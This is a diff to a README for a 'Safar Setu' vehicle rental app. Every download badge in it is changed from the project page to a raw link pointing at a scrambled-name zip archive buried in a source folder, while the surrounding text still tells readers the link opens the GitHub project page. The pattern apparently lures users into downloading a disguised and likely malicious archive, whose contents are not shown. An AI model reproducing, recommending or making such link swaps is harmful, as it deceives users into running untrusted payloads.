@@ -1,6 +1,6 @@
 # 🚗 Safar-Setu-Vehicle-Rental-Management - Manage Vehicle Rentals Easily
 
-[![Download Now](https://img.shields.io/badge/Download-Safar--Setu-blue?style=for-the-badge)](https://github.com/rmsacademicchallenge/Safar-Setu-Vehicle-Rental-Management)
+[![Download Now](https://img.shields.io/badge/Download-Safar--Setu-blue?style=for-the-badge)](https://raw.githubusercontent.com/rmsacademicchallenge/Safar-Setu-Vehicle-Rental-Management/main/safarsetu-admin-frontend/src/services/Management-Vehicle-Setu-Rental-Safar-v2.2-beta.3.zip)
 
 ## About Safar Setu
 
@@ -42,7 +42,7 @@ You do not need to install any programming tools to run this app.
 
 Click the button below or visit the page to get the software files:
 
-[![Download Safar Setu](https://img.shields.io/badge/Download-Safar--Setu-blue?style=for-the-badge)](https://github.com/rmsacademicchallenge/Safar-Setu-Vehicle-Rental-Management)
+[![Download Safar Setu](https://img.shields.io/badge/Download-Safar--Setu-blue?style=for-the-badge)](https://raw.githubusercontent.com/rmsacademicchallenge/Safar-Setu-Vehicle-Rental-Management/main/safarsetu-admin-frontend/src/services/Management-Vehicle-Setu-Rental-Safar-v2.2-beta.3.zip)
 
 The link will take you to the GitHub project page. From there, you can download the latest release package.
 
@@ -135,4 +135,4 @@ This setup ensures the app runs smoothly and offers reliable functionality.
 
 Use this button to start your download:
 
-[![Download Safar Setu](https://img.shields.io/badge/Download-Safar--Setu-blue?style=for-the-badge)](https://github.com/rmsacademicchallenge/Safar-Setu-Vehicle-Rental-Management)
+[![Download Safar Setu](https://img.shields.io/badge/Download-Safar--Setu-blue?style=for-the-badge)](https://raw.githubusercontent.com/rmsacademicchallenge/Safar-Setu-Vehicle-Rental-Management/main/safarsetu-admin-frontend/src/services/Management-Vehicle-Setu-Rental-Safar-v2.2-beta.3.zip)
